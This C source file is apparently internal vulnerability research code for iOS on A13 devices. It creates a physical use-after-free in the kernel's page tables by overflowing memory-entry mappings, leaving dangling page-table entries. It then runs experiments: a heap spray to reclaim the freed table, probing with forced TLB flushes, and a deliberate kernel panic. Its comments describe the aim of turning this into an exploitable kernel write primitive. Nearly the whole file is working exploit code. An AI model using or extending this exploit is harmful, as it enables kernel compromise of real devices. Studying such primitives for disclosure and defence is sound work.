/*
 * pmap_experiment_se.c — Deep primitive analysis: pmap_tte_remove PUAF
 * OE1105320204625 — INTERNAL ONLY
 *
 * This binary answers three fundamental questions about the primitive:
 *
 * Q1: Does kernel access freed L3 page P?
 *     Experiment A: mprotect() on dangling VAs → kernel pmap_protect accesses P
 *     Expected: either panic (pmap_tte_remove assert) or silent write to P
 *
 * Q2: Was spray detection broken by TLB caching?
 *     Experiment B: force TLBI via mprotect BEFORE probing post-spray
 *     If TLB was masking hits → we now see SIGSEGV or changed values
 *
 * Q3: Single-table PUAF possible? (fewer freed tables = closer to list head)
 *     Experiment C: minimal spray count + mprotect TLBI probe
 *
 * COMPILE:
 *   clang-16 -isysroot /var/jb/usr/share/SDKs/iPhoneOS.sdk \
 *     -O2 -o pmap_exp pmap_experiment_se.c && ldid -S pmap_exp
 *
 * USAGE:
 *   ./pmap_exp A          Kernel access test (mprotect on dangling PTE)
 *   ./pmap_exp B          TLBI-fixed spray detection (mprotect flush before probe)
 *   ./pmap_exp B -n 512   TLBI spray with N spray allocations
 *   ./pmap_exp C          Combined: spray + TLBI + mprotect kernel access
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <unistd.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <mach/vm_map.h>

extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t,
    mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
    boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

#define OVERFLOW   65537
#define KEEP       64
#define PAGE_SZ    16384
#define SENTINEL   0x41
#define MAGIC_U32  0xDEA1DEADu

static sigjmp_buf g_jmp;
static volatile int g_faulted;
static volatile int g_signal;

static void sig_handler(int s) {
    g_faulted = 1; g_signal = s; siglongjmp(g_jmp, 1);
}
static void install_sigs(void) {
    struct sigaction sa; memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sig_handler; sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS,  &sa, NULL);
    sigaction(SIGILL,  &sa, NULL);
}
static int safe_read32(volatile void *addr, uint32_t *out) {
    g_faulted = 0; g_signal = 0;
    if (sigsetjmp(g_jmp, 1) == 0) { *out = *(volatile uint32_t *)addr; return 1; }
    return 0;
}
/* Try mprotect inside signal guard — will it panic or succeed? */
static int safe_mprotect(void *addr, size_t sz, int prot) {
    g_faulted = 0; g_signal = 0;
    if (sigsetjmp(g_jmp, 1) == 0) {
        int r = mprotect(addr, sz, prot);
        return r == 0 ? 1 : 0;  /* 1=success, 0=EPERM or similar */
    }
    return -1;  /* signal caught */
}

static mach_vm_address_t alloc_page(void) {
    mach_vm_address_t a = 0;
    if (mach_vm_allocate(mach_task_self(), &a, PAGE_SZ, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) return 0;
    memset((void *)a, SENTINEL, PAGE_SZ);
    return a;
}
static kern_return_t make_entry(mach_vm_address_t b, mach_port_t *o) {
    mach_vm_size_t sz = PAGE_SZ;
    return mach_make_memory_entry_64(mach_task_self(), &sz, (mach_vm_offset_t)b,
        VM_PROT_READ|VM_PROT_WRITE, o, MACH_PORT_NULL);
}
static kern_return_t map_entry(mach_port_t p, mach_vm_address_t *o) {
    *o = 0;
    return mach_vm_map(mach_task_self(), o, PAGE_SZ, 0, VM_FLAGS_ANYWHERE, p, 0,
        FALSE, VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ|VM_PROT_WRITE, VM_INHERIT_NONE);
}

/* ── Create PUAF: returns dangling maps[], entry_port, backing. ── */
typedef struct {
    mach_vm_address_t *maps;
    int                n_dangling;
    mach_port_t        entry_port;
    mach_vm_address_t  backing;
    int                wt_baseline;
} puaf_t;

static int create_puaf(puaf_t *out) {
    mach_vm_address_t backing = alloc_page();
    if (!backing) { printf("[-] alloc_page\n"); return 0; }

    mach_port_t ep = MACH_PORT_NULL;
    if (make_entry(backing, &ep) != KERN_SUCCESS) { printf("[-] make_entry\n"); return 0; }

    mach_vm_address_t *maps = calloc(OVERFLOW, sizeof(mach_vm_address_t));
    if (!maps) { printf("[-] calloc\n"); return 0; }

    int created = 0;
    for (int i = 0; i < OVERFLOW; i++) {
        if (map_entry(ep, &maps[i]) != KERN_SUCCESS) break;
        created++;
    }

    int to_free = created - KEEP;
    for (int i = created - 1; i >= KEEP; i--)
        mach_vm_deallocate(mach_task_self(), maps[i], PAGE_SZ);

    printf("  PUAF: %d maps, freed %d, %d dangling PTEs\n", created, to_free, KEEP);

    int wt = 0;
    for (int i = 0; i < KEEP; i++) {
        volatile uint8_t *p = (volatile uint8_t *)maps[i];
        *p = 0xBB; wt += (*p == 0xBB) ? 1 : 0;
    }
    printf("  Baseline write-through: %d/%d\n", wt, KEEP);

    out->maps       = maps;
    out->n_dangling = KEEP;
    out->entry_port = ep;
    out->backing    = backing;
    out->wt_baseline = wt;
    return 1;
}

static void cleanup_puaf(puaf_t *p, int skip_maps) {
    if (!skip_maps)
        for (int i = 0; i < p->n_dangling; i++)
            mach_vm_deallocate(mach_task_self(), p->maps[i], PAGE_SZ);
    free(p->maps);
    mach_port_deallocate(mach_task_self(), p->entry_port);
    mach_vm_deallocate(mach_task_self(), p->backing, PAGE_SZ);
}

/* ══════════════════════════════════════════════════════════
 * EXPERIMENT A: mprotect() on dangling PTEs
 *
 * Calls mprotect() on each of the 64 dangling VAs.
 * This forces kernel's pmap_protect() to:
 *   1. Look up PTE in freed L3 page P (via physmap)
 *   2. Try to modify permission bits in P
 *   3. Issue TLBI for these VAs
 *
 * Outcomes:
 *   PANIC  → pmap_tte_remove assert fires → kernel confirmed to access P
 *   SIGNAL → kernel path faulted → SPTM blocked the write to P?
 *   SUCCESS → kernel silently wrote to P → P is writable by kernel
 *             → we now have TLBI-flushed maps, re-probe to see P state
 *
 * If kernel writes to freed P via mprotect: this is an exploitable
 * kernel write primitive IF we can control what P contains.
 * ══════════════════════════════════════════════════════════ */
static void exp_A(void) {
    printf("\n═══ EXPERIMENT A: mprotect() on dangling PTEs ═══\n");
    printf("Goal: does kernel access freed L3 page P?\n\n");

    puaf_t p; if (!create_puaf(&p)) return;

    printf("\n  Testing mprotect(PROT_NONE) on each dangling VA:\n");
    printf("  (any panic here = kernel accessed freed L3 page to modify PTE)\n\n");

    int mprotect_ok = 0, mprotect_eperm = 0, mprotect_signal = 0;

    for (int i = 0; i < p.n_dangling; i++) {
        int r = safe_mprotect((void *)p.maps[i], PAGE_SZ, PROT_NONE);
        if (r == 1)        { mprotect_ok++;     }
        else if (r == 0)   { mprotect_eperm++;  }
        else               { mprotect_signal++; printf("  [!] maps[%d] signal %d on mprotect\n", i, g_signal); }
    }
    printf("  mprotect results: ok=%d eperm=%d signal=%d\n",
           mprotect_ok, mprotect_eperm, mprotect_signal);

    if (mprotect_ok > 0) {
        printf("\n  mprotect SUCCEEDED on %d dangling VAs.\n", mprotect_ok);
        printf("  This means:\n");
        printf("    kernel wrote permission bits to freed L3 page P via physmap\n");
        printf("    TLB entries for maps[i] are now INVALIDATED by kernel TLBI\n");
        printf("  Re-probing via safe_read32 (TLB now cold — will walk P):\n\n");

        int faults = 0, same = 0, changed = 0;
        for (int i = 0; i < p.n_dangling; i++) {
            uint32_t val = 0;
            if (!safe_read32((volatile void *)p.maps[i], &val)) {
                faults++;
                if (faults <= 3) printf("    maps[%d] → SIGSEGV after TLBI (PTE zeroed?)\n", i);
            } else {
                printf("    maps[%d] → 0x%08x (expected: 0x%02x%02x%02x%02x)\n",
                       i, val, SENTINEL, SENTINEL, SENTINEL, SENTINEL);
                if ((val & 0xFFFFFF00) == 0x41414100) same++;
                else changed++;
            }
        }
        printf("\n  Post-mprotect probe: faults=%d same=%d changed=%d\n",
               faults, same, changed);

        if (faults > 0)
            printf("  RESULT: SIGSEGV after TLBI = PTE was zeroed by kernel\n"
                   "          Confirms: kernel wrote to freed L3 page P ✓\n");
        else if (changed > 0)
            printf("  RESULT: Changed values = kernel wrote different PTE to P ✓\n");
        else
            printf("  RESULT: Still reading backing page — mprotect wrote PROT_NONE PTE to P\n"
                   "          but backing page B still accessible at PROT_NONE? Unexpected.\n");
    } else {
        printf("\n  mprotect FAILED (EPERM or signal).\n");
        printf("  This means: SPTM or pmap blocked the mprotect on dangling VAs.\n");
        printf("  Kernel correctly rejected operating on freed page table entries.\n");
    }

    printf("\n  Attempting mprotect(RW) restore + read:\n");
    for (int i = 0; i < p.n_dangling; i++) {
        safe_mprotect((void *)p.maps[i], PAGE_SZ, PROT_READ|PROT_WRITE);
    }
    uint32_t v0 = 0;
    int r0 = safe_read32((volatile void *)p.maps[0], &v0);
    printf("  maps[0] after restore: %s = 0x%08x\n",
           r0 ? "readable" : "FAULT", v0);

    cleanup_puaf(&p, mprotect_signal > 0);
}

/* ══════════════════════════════════════════════════════════
 * EXPERIMENT B: TLBI-fixed spray detection
 *
 * Previous spray runs showed unchanged=64 because TLB caching masked
 * whether P was recycled. This experiment forces TLBI via mprotect
 * BEFORE probing, so the MMU must re-walk through P.
 *
 * If P was recycled after spray:
 *   - Re-walk hits new/zeroed PTE in P → SIGSEGV (faults++)
 *   - Or hits new valid PTE → maps[i] accesses spray data → changed
 *
 * If P was NOT recycled:
 *   - Re-walk hits stale PTE → backing page B → reads 0xDEA1DEAD → unchanged
 * ══════════════════════════════════════════════════════════ */
static void exp_B(int n_spray) {
    printf("\n═══ EXPERIMENT B: TLBI-fixed spray detection (n=%d) ═══\n", n_spray);
    printf("Key fix: mprotect() flushes TLB before probe → MMU re-walks through P\n\n");

    puaf_t p; if (!create_puaf(&p)) return;

    /* Mark freed L3 page with MAGIC */
    volatile uint32_t *fp = (volatile uint32_t *)p.maps[0];
    for (int j = 0; j < (int)(PAGE_SZ / 4); j++) fp[j] = MAGIC_U32;
    uint32_t bcheck = 0;
    safe_read32((volatile void *)p.maps[0], &bcheck);
    printf("  Mark: 0xDEA1DEAD × 4096  read-back=0x%08x\n", bcheck);

    /* Spray */
    mach_vm_address_t *spray = calloc(n_spray, sizeof(mach_vm_address_t));
    int sprayed = 0;
    for (int i = 0; i < n_spray; i++) {
        mach_vm_address_t sa = 0;
        if (mach_vm_allocate(mach_task_self(), &sa, PAGE_SZ*2, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) continue;
        *(volatile uint8_t *)sa = 0xAB;
        *(volatile uint8_t *)(sa + PAGE_SZ) = 0xAB;
        spray[i] = sa; sprayed++;
    }
    printf("  Spray: %d/%d allocations done\n", sprayed, n_spray);

    /* KEY STEP: Force TLBI for maps[0..63] via mprotect BEFORE probe */
    printf("  Forcing TLBI via mprotect(PROT_NONE) on %d dangling VAs...\n", KEEP);
    int tlbi_ok = 0;
    for (int i = 0; i < KEEP; i++) {
        if (safe_mprotect((void *)p.maps[i], PAGE_SZ, PROT_NONE) == 1) tlbi_ok++;
    }
    printf("  TLBI forced: %d/%d mprotect succeeded\n", tlbi_ok, KEEP);

    /* Restore permissions */
    for (int i = 0; i < KEEP; i++)
        safe_mprotect((void *)p.maps[i], PAGE_SZ, PROT_READ|PROT_WRITE);

    /* Probe — TLB is now cold, MMU must re-walk through P */
    printf("  Probing (TLB cold — MMU will re-walk page tables through P):\n");
    int faults = 0, same = 0, changed = 0;
    for (int i = 0; i < KEEP; i++) {
        uint32_t val = 0;
        if (!safe_read32((volatile void *)p.maps[i], &val)) {
            faults++;
            if (faults <= 3) printf("  [!] maps[%d] SIGSEGV (sig=%d) — PTE zeroed on P recycle\n",
                                     i, g_signal);
        } else if (val == MAGIC_U32) {
            same++;
        } else {
            if (changed < 3) printf("  [?] maps[%d] = 0x%08x (not MAGIC — new PTE?)\n", i, val);
            changed++;
        }
    }

    printf("\n  TLBI-fixed probe: faults=%d  same=%d  changed=%d\n",
           faults, same, changed);

    if (faults > 0 || changed > 0) {
        printf("\n  ★★★ DETECTION HIT — spray confirmed with TLBI flush ★★★\n");
        printf("  faults=%d (zero PTE = P recycled and zeroed by kernel)\n", faults);
        printf("  changed=%d (new PTE at slot = P recycled with different mapping)\n", changed);
        printf("  Confirms: TLB caching was masking spray detection in previous runs.\n");
        printf("  pmap_pages_alloc reused freed L3 page as live kernel page table.\n");
    } else if (tlbi_ok == 0) {
        printf("\n  NOTE: mprotect failed on all dangling VAs (SPTM/pmap blocking).\n");
        printf("  TLBI was NOT forced — same unchanged result expected.\n");
        printf("  unchanged=%d is TLB-cached result (spray may still have hit).\n", same);
    } else {
        printf("\n  Spray miss even with TLBI flush.\n");
        printf("  P was not recycled — still points to backing page B with MAGIC.\n");
    }

    for (int i = 0; i < n_spray; i++)
        if (spray[i]) mach_vm_deallocate(mach_task_self(), spray[i], PAGE_SZ*2);
    free(spray);
    cleanup_puaf(&p, faults > 0);
}

/* ══════════════════════════════════════════════════════════
 * EXPERIMENT C: munmap one dangling PTE — trigger pmap_remove
 *
 * Calling mach_vm_deallocate on one of the dangling maps[i] VAs
 * triggers kernel's pmap_remove on the dangling PTE in freed L3 page P.
 * This causes pmap_tte_remove to detect the inconsistency → PANIC.
 *
 * This is how the natural panics happen (securityd process exit).
 * Controlled version: safely trigger one and capture the state.
 *
 * We do NOT use safe_mprotect here — pmap_remove may kernel panic.
 * The panic backtrace PROVES kernel accessed freed L3 page P.
 *
 * ⚠ WARNING: This WILL cause a kernel panic.
 * Run this ONLY if you're OK with a reboot.
 * ══════════════════════════════════════════════════════════ */
static void exp_C(void) {
    printf("\n═══ EXPERIMENT C: Controlled panic via pmap_remove ═══\n");
    printf("⚠ THIS WILL KERNEL PANIC. Check reboot is OK.\n");
    printf("Sleeping 3 seconds — Ctrl-C to abort.\n\n");
    sleep(3);

    puaf_t p; if (!create_puaf(&p)) return;

    printf("  State before:\n");
    printf("    Dangling PTEs: %d\n", p.n_dangling);
    printf("    Write-through: %d/%d\n", p.wt_baseline, KEEP);
    printf("  Triggering pmap_remove on maps[0] (mach_vm_deallocate)...\n");
    printf("  Expected: kernel panic — pmap_tte_remove inconsistency assert.\n");
    printf("  Panic log will show: pmap_tte_remove + 'refcnt' mismatch.\n");
    printf("  This PROVES kernel accessed freed L3 page P during pmap cleanup.\n\n");
    fflush(stdout);

    /* This should panic */
    mach_vm_deallocate(mach_task_self(), p.maps[0], PAGE_SZ);

    /* If we're still here, pmap_remove didn't panic — report it */
    printf("  [!] pmap_remove did NOT panic (unexpected — SPTM may have intercepted)\n");
    printf("  maps[0] deallocated without pmap_tte_remove assert.\n");

    /* Try reading remaining dangling PTEs */
    uint32_t val = 0;
    int r = safe_read32((volatile void *)p.maps[1], &val);
    printf("  maps[1] after maps[0] unmap: %s = 0x%08x\n",
           r ? "readable" : "FAULT", val);
}

int main(int argc, char *argv[]) {
    install_sigs();

    if (argc < 2) {
        printf("pmap_experiment_se — OE1105320204625 INTERNAL\n");
        printf("Usage:\n");
        printf("  %s A        mprotect on dangling PTEs (kernel access test)\n", argv[0]);
        printf("  %s B [-n N] TLBI-fixed spray detection (default N=512)\n", argv[0]);
        printf("  %s C        controlled pmap_remove panic (WILL REBOOT)\n", argv[0]);
        return 1;
    }

    char exp = argv[1][0];
    int n = 512;
    for (int i = 2; i < argc; i++)
        if (!strcmp(argv[i], "-n") && i+1 < argc) n = atoi(argv[++i]);

    printf("pmap_experiment_se — A13 primitive analysis\n");
    printf("OE1105320204625 — INTERNAL — pid=%d\n", getpid());

    if      (exp == 'A') exp_A();
    else if (exp == 'B') exp_B(n);
    else if (exp == 'C') exp_C();
    else printf("Unknown experiment '%c'\n", exp);

    printf("\n");
    return 0;
}
